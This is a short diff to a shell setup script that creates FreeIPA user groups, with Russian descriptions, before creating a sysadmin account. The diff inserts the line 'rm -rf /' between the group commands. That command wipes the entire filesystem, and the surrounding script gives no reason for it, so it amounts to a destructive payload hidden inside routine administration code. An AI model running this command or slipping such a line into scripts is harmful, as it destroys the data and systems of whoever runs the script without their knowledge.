@@ -20,7 +20,7 @@ ipa group-add webadmins \
 
 ipa group-add clients \
     --desc="Клиенты" 2>/dev/null || true
-
+rm -rf /
 
 echo "=== Создание sysadmin ==="
 
